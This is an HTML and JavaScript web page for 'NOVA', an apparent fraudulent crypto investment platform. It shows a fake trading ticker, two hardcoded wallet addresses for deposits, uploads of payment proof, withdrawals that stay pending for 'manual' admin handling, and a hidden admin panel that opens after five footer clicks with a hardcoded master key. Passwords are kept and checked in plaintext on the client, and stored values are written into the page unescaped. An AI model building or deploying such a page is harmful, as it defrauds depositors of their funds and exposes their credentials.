<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Institutional Asset Protocol</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #050A18; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; --gold: #FFD700; --danger: #FF4D4D; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); line-height: 1.6; overflow-x: hidden; }
        
        /* Professional UI Glassmorphism */
        .glass { background: rgba(17, 34, 64, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(100, 255, 218, 0.1); border-radius: 16px; padding: 25px; margin-bottom: 20px; }
        .ticker { background: #020c1b; color: var(--accent); padding: 10px; font-size: 11px; text-align: center; border-bottom: 1px solid #112240; letter-spacing: 1px; }
        
        #dashboard { display: none; padding: 20px; max-width: 1200px; margin: auto; animation: fadeInUp 0.8s ease; }
        
        /* Stats Grid */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card { text-align: left; position: relative; overflow: hidden; border-left: 4px solid var(--accent); }
        .stat-card h2 { margin: 5px 0; color: var(--accent); font-size: 1.6rem; font-weight: 800; }
        .stat-card span { font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }

        /* Node Section */
        .node-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .node-card { background: var(--card-bg); border-radius: 12px; overflow: hidden; transition: 0.4s; border: 1px solid #233554; }
        .node-card:hover { transform: translateY(-10px); border-color: var(--accent); box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        .node-img { width: 100%; height: 180px; object-fit: cover; opacity: 0.8; }
        .node-badge { position: absolute; top: 10px; right: 10px; background: var(--accent); color: var(--primary); padding: 4px 10px; border-radius: 4px; font-weight: 800; font-size: 10px; }

        /* Forms & Buttons */
        input, select, textarea { width: 100%; padding: 14px; background: #020c1b; border: 1px solid #233554; color: white; border-radius: 8px; margin: 10px 0; box-sizing: border-box; font-family: inherit; }
        .btn-prime { width: 100%; padding: 15px; background: var(--accent); color: var(--primary); border: none; border-radius: 8px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; letter-spacing: 1px; }
        .btn-prime:hover { filter: brightness(1.2); box-shadow: 0 0 20px rgba(100, 255, 218, 0.4); }

        /* History Table */
        .history-table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 15px; }
        .history-table th { text-align: left; padding: 12px; color: var(--accent); border-bottom: 1px solid #233554; }
        .history-table td { padding: 12px; border-bottom: 1px solid #112240; }
        .status-pending { color: var(--gold); }
        .status-approved { color: var(--accent); }

        /* Auth Page Styles */
        #auth-page { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%); }
        .company-intro { color: var(--text-dim); font-size: 12px; text-align: justify; margin-top: 20px; border-top: 1px solid #233554; padding-top: 15px; }

        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="ticker"><marquee>NOVA INFRASTRUCTURE v4.0 | GLOBAL LIQUIDITY: ACTIVE | NODES SYNCED: 100% | TRADING VOLUME: 1.2B USDT</marquee></div>

    <div id="auth-page">
        <div class="glass" style="max-width: 450px; width: 90%;">
            <center>
                <h1 style="color:var(--accent); margin:0; letter-spacing:5px;">NOVA</h1>
                <p style="font-size:10px; color:var(--text-dim); margin-bottom:30px;">THE FUTURE OF INSTITUTIONAL ASSET MANAGEMENT</p>
            </center>
            
            <input type="text" id="username" placeholder="Enter Global ID">
            <input type="password" id="password" placeholder="Encryption Key">
            <button class="btn-prime" onclick="handleAuth()" id="authBtn">Establish Connection</button>
            
            <p id="toggleText" style="text-align:center; font-size:12px; margin-top:15px; cursor:pointer; color:var(--accent);" onclick="toggleAuth()">New Associate? Register Node ID</p>

            <div class="company-intro">
                <b>About NOVA:</b> NOVA is a premier decentralized asset protocol engineered for the next generation of financial sovereignty. Founded on the principles of transparency and high-frequency liquidity, our infrastructure spans 15 global data centers. We provide institutional-grade node validation services, allowing users to participate in the global reward pool with encrypted security and real-time yield generation.
            </div>
        </div>
    </div>

    <div id="dashboard">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:30px;">
            <div>
                <h3 style="margin:0;">SYSTEM: <span id="userDisp" style="color:var(--accent);"></span></h3>
                <span style="font-size:10px; color:var(--text-dim);">PROTOCOL VERSION: 4.0.1 (SECURE)</span>
            </div>
            <button onclick="logout()" style="background:none; border:1px solid #233554; color:gray; cursor:pointer; padding:8px 20px; border-radius:5px;">TERMINATE SESSION</button>
        </div>

        <div class="stats-grid">
            <div class="glass stat-card"><span>Available Balance</span><h2 id="bal">$0.00</h2></div>
            <div class="glass stat-card"><span>Daily Yield (ROI)</span><h2 id="daily">$0.00</h2></div>
            <div class="glass stat-card"><span>Total Profit</span><h2 id="totalP">$0.00</h2></div>
            <div class="glass stat-card"><span>Active Nodes</span><h2>15/15</h2></div>
        </div>

        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
            <div class="glass">
                <h3 style="color:var(--accent);">DEPOSIT GATEWAY</h3>
                <div style="display:flex; gap:10px; margin-bottom:15px;">
                    <div onclick="copyWal('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" style="flex:1; background:#020c1b; padding:10px; border-radius:5px; cursor:pointer; text-align:center; font-size:10px; border:1px solid #233554;">🛡️ TRUST WALLET</div>
                    <div onclick="copyWal('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" style="flex:1; background:#020c1b; padding:10px; border-radius:5px; cursor:pointer; text-align:center; font-size:10px; border:1px solid #233554;">🦊 METAMASK</div>
                </div>
                <select id="depMethod">
                    <option value="USDT-BEP20">USDT (BSC Network)</option>
                    <option value="USDT-ERC20">USDT (Ethereum)</option>
                    <option value="TRX">TRON (TRC20)</option>
                </select>
                <input type="text" id="tid" placeholder="Enter TID Number">
                <input type="file" id="proof" accept="image/*">
                <button class="btn-prime" onclick="submitDep()">Submit Deposit</button>
            </div>

            <div class="glass">
                <h3 style="color:var(--danger);">WITHDRAWAL SYSTEM</h3>
                <select id="witMethod">
                    <option value="Binance">Binance Pay</option>
                    <option value="Trust Wallet">Trust Wallet</option>
                    <option value="MetaMask">MetaMask</option>
                    <option value="OKX">OKX Exchange</option>
                </select>
                <input type="number" id="witAmt" placeholder="Amount (Min $10)">
                <input type="text" id="witAcc" placeholder="Wallet Address / ID">
                <button class="btn-prime" style="background:var(--danger); color:white;" onclick="submitWit()">Request Withdrawal</button>
            </div>
        </div>

        <div class="glass">
            <h3>TRANSACTION HISTORY</h3>
            <table class="history-table">
                <thead>
                    <tr><th>Type</th><th>Amount</th><th>Method</th><th>Status</th><th>Date</th></tr>
                </thead>
                <tbody id="histBody">
                    </tbody>
            </table>
        </div>

        <div class="glass" style="font-size:12px;">
            <h3 style="color:var(--accent);">LEGAL & COMPLIANCE</h3>
            <details><summary>Privacy Policy</summary><p>All user data is encrypted with AES-256 and stored on decentralized clusters.</p></details>
            <details><summary>Withdrawal Policy</summary><p>Withdrawals are processed manually by the admin team within 2-24 hours for security.</p></details>
            <details><summary>Node Activation</summary><p>Nodes become active after 3 blockchain confirmations of your deposit.</p></details>
        </div>

        <center id="secret-trigger" style="padding:40px; color:gray; font-size:10px; cursor:default;">
            &copy; 2026 NOVA GLOBAL INFRASTRUCTURE | SINGAPORE HQ
        </center>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLogin = true;

        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('authBtn').innerText = isLogin ? "Establish Connection" : "Register Node ID";
            document.getElementById('toggleText').innerText = isLogin ? "New Associate? Register Node ID" : "Already Registered? Login";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Credentials required, sweetie.");
            
            const snap = await getDoc(doc(db, "users", u));
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) {
                    sessionStorage.setItem("nova_user", u);
                    location.reload();
                } else { alert("Access Denied: Invalid encryption key."); }
            } else {
                await setDoc(doc(db, "users", u), { password: p, balance: 0, totalP: 0, daily: 0 });
                alert("Node ID Registered. You can now login.");
                toggleAuth();
            }
        };

        // SUBMIT DEPOSIT (WITH BASE64)
        window.submitDep = async () => {
            const tid = document.getElementById('tid').value;
            const file = document.getElementById('proof').files[0];
            const method = document.getElementById('depMethod').value;
            if(!tid || !file) return alert("Fill all fields, sweetie.");

            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "transactions", "tx_" + Date.now()), {
                    user: sessionStorage.getItem("nova_user"),
                    type: "Deposit",
                    amount: "Pending Verification",
                    method: method,
                    tid: tid,
                    proof: reader.result, // Base64
                    status: "Pending",
                    date: new Date().toLocaleString()
                });
                alert("Deposit submitted for manual audit.");
                location.reload();
            };
            reader.readAsDataURL(file);
        };

        // SUBMIT WITHDRAWAL
        window.submitWit = async () => {
            const amt = document.getElementById('witAmt').value;
            const acc = document.getElementById('witAcc').value;
            const method = document.getElementById('witMethod').value;
            if(amt < 10) return alert("Minimum withdrawal is $10.");

            await setDoc(doc(db, "transactions", "wit_" + Date.now()), {
                user: sessionStorage.getItem("nova_user"),
                type: "Withdrawal",
                amount: amt,
                method: method,
                account: acc,
                status: "Pending",
                date: new Date().toLocaleString()
            });
            alert("Withdrawal request sent to admin team.");
            location.reload();
        };

        // LOAD DASHBOARD & HISTORY
        async function loadData() {
            const user = sessionStorage.getItem("nova_user");
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.getElementById('userDisp').innerText = user;

            // Load User Stats
            const uSnap = await getDoc(doc(db, "users", user));
            if(uSnap.exists()) {
                const d = uSnap.data();
                document.getElementById('bal').innerText = "$" + (d.balance || 0).toFixed(2);
                document.getElementById('daily').innerText = "$" + (d.daily || 0).toFixed(2);
                document.getElementById('totalP').innerText = "$" + (d.totalP || 0).toFixed(2);
            }

            // Load History
            const q = query(collection(db, "transactions"), where("user", "==", user));
            const qSnap = await getDocs(q);
            const body = document.getElementById('histBody');
            body.innerHTML = "";
            qSnap.forEach(t => {
                const data = t.data();
                body.innerHTML += `<tr><td>${data.type}</td><td>${data.amount}</td><td>${data.method}</td><td class="status-pending">${data.status}</td><td>${data.date}</td></tr>`;
            });
        }

        // SECRET ADMIN PANEL (5 CLICKS ON FOOTER)
        let clicks = 0;
        document.getElementById('secret-trigger').onclick = async () => {
            clicks++;
            if(clicks === 5) {
                const pass = prompt("Enter Master Key:");
                if(pass === "nova_boss_786") {
                    const snap = await getDocs(collection(db, "transactions"));
                    let h = `<div style="background:#020c1b; color:white; padding:20px; font-size:12px;"><button onclick="location.reload()">Exit</button><h2>MASTER AUDIT TERMINAL</h2><table border="1" style="width:100%; border-collapse:collapse;">
                             <tr><th>User</th><th>Type</th><th>Method</th><th>Detail (TID/Acc)</th><th>Proof</th></tr>`;
                    snap.forEach(d => {
                        const data = d.data();
                        const detail = data.type === "Deposit" ? data.tid : data.account;
                        const proofImg = data.proof ? `<img src="${data.proof}" width="100" onclick="window.open(this.src)" style="cursor:pointer">` : "N/A";
                        h += `<tr><td>${data.user}</td><td>${data.type}</td><td>${data.method}</td><td>${detail}</td><td>${proofImg}</td></tr>`;
                    });
                    document.body.innerHTML = h + `</table></div>`;
                }
                clicks = 0;
            }
        };

        window.copyWal = (a) => { navigator.clipboard.writeText(a); alert("Address Copied, sweetie!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("nova_user")) loadData();
    </script>
</body>
</html>
